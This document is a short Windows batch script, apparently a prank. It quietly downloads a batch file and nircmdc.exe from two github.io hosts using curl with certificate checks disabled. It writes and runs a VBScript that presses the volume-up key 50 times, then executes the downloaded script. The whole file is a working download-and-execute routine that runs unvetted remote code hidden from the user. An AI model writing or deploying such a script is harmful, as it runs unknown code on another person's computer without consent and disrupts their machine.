@echo off
start /wait /min "" cmd /c curl -kLOS stivengiv.github.io/p/play.bat -O aritz331.github.io/stuff/nircmdc.exe

echo Set WshShell = CreateObject^(^"WScript.Shell^"^) > "%temp%\a.vbs"
echo For i = 1 to 50 >> "%temp%\a.vbs"
echo.  WshShell.SendKeys^(chr^(^&hAF^)^) >> "%temp%\a.vbs"
echo Next >> "%temp%\a.vbs"

start %temp%\a.vbs

%temp%\play.bat aser
